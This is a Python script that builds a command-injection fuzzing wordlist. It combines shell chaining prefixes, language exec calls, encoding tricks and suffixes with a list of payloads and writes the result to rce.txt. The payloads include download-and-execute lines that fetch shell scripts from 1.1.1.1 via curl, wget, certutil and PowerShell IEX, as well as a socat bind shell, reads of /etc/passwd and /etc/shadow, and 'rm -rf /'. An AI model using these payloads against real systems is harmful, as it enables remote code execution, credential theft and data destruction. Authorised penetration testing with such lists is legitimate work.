import itertools
import urllib.parse

parameters = [
    ""
]

prefixes = [
    # Common shell operators / chaining
    "; ",
    "| ",
    "|| ",
    "& ",
    "&& ",
    "&| ",
    "|& ",
    "${IFS}",        # Bypass for space
    ";${IFS}",       # Another space bypass
    "%0A",           # URL-encoded newline
    "%26",           # URL-encoded '&'
    "%7C",           # URL-encoded '|'
    "< ",
    "> ",
    "2>&1",
    # Language-specific injection calls
    "Runtime.getRuntime().exec(\"",
    "new ProcessBuilder().command(\"",
    "ProcessBuilder(\"",
    "os.system(\"",
    "subprocess.call([\"",
    "eval(\"",
    "exec(\"",
    "system(\"",
    "shell_exec(\"",
    "passthru(\"",
    "System.Diagnostics.Process.Start(\"",
    "Process.Start(\"",
    "powershell -Command \"",
    "cmd /c ",
    "bash -c \"",
    "sh -c \"",
    "exec /bin/sh",
    "sh -i",
    "sh -l",
    "bash -i",
    "bash -l",
    "zsh -c \""
]



payloads = [
    # Basic enumeration
    "id",
    "whoami",
    "uname -a",
    "ls -la",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ps aux",
    "netstat -anp",
    "ifconfig -a",
    "ip link show",
    "ipconfig /all",
    "tasklist",
    "net user",
    "dir C:\\Windows\\System32\\drivers\\etc",

    # Advanced discovery / pivot
    "find / -type f -name '*.conf'",
    "wmic process list brief",
    "powershell.exe Get-Process",
    "g++ --version",
    "java -version",
    "python --version",

    # Download + execute (Linux/Windows)
    "curl http://1.1.1.1/shell.sh | sh",
    "wget http://1.1.1.1/shell.sh -O /tmp/shell.sh && sh /tmp/shell.sh",
    "certutil -urlcache -f http://1.1.1.1/payload.exe payload.exe && payload.exe",
    "powershell -Command \"IEX(IWR http://1.1.1.1/shell.ps1)\"",
    "curl http://1.1.1.1/shell.sh | sh",
    "wget http://1.1.1.1/shell.sh -O /tmp/shell.sh && sh /tmp/shell.sh",
    "powershell -Command \"IEX(IWR http://1.1.1.1/shell.ps1)\"",
    "certutil -urlcache -f http://1.1.1.1/payload.exe payload.exe && payload.exe",

    # Language-specific calls
    "eval('system(\"ls\")')",
    "Runtime.getRuntime().exec(\"touch /tmp/hacked\")",
    "Process.Start(\"powershell\", \"-Command whoami\")",
    "eval('os.system(\"ls\")')",
    "echo $(ls)",
    "echo $(id)",
    "sleep 2; id",
    "echo 'test' > /tmp/testfile",
    "bash -c 'echo malicious > /tmp/malicious.txt'",
    "rm -rf /; touch /tmp/exploit",
    "echo $(curl http://1.1.1.1/exploit.sh | sh)",

    # Additional shell tricks
    "ping -c 4 127.0.0.1",
    "sleep 5",
    "tail -f /var/log/syslog",
    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "socat tcp-listen:4444 exec:/bin/bash"
]


suffixes = [
    " #",
    "//",
    "/*",
    " #",
    " \\\\",
    " //",
    "%0A",
    "2>&1",
    "; echo 'Done'",
    "> /tmp/out.txt",
    "&& rm -rf /tmp/*",
    "--",
    "/*",
    "'",
    "\")",
    ");",
    "; //",
    "')",
    ";#",
    "/)",
    ";)",
    "&)",
    "|)",
    "');",
    "%0A#",
    "%0A//",
    "; exit",
    "; sleep 5",
    "; ping -c 4 127.0.0.1",
    "%0A/*"
]


def encode_all(s: str) -> str:
    return urllib.parse.quote(s, safe="")

def encode_special(s: str) -> str:
    special_chars = set(";|& \"'()<>% ")
    return "".join(urllib.parse.quote(ch, safe="") if ch in special_chars else ch for ch in s)

def escape_chars(s: str) -> str:
    special_chars = set(";|&\"'()<>")
    return "".join("\\"+ch if ch in special_chars else ch for ch in s)

modes = {
    "normal": lambda x: x,
    "all_encoded": encode_all,
    "special_encoded": encode_special,
    "escaped": escape_chars
}

def generate_all():
    for param, mode_name, payload in itertools.product(parameters, modes, payloads):
        transform = modes[mode_name]

        # (1) param + payload
        yield f"{param}{transform(payload)}"

        # (2) param + prefix + payload
        for pf in prefixes:
            yield f"{param}{transform(pf + payload)}"

        # (3) param + payload + suffix
        for sf in suffixes:
            yield f"{param}{transform(payload + sf)}"

        # (4) param + prefix + payload + suffix
        for pf, sf in itertools.product(prefixes, suffixes):
            yield f"{param}{transform(pf + payload + sf)}"



if __name__ == "__main__":
    with open("rce.txt", "w") as file:
        for final_payload in generate_all():
            print(final_payload)
            file.write(final_payload + "\n")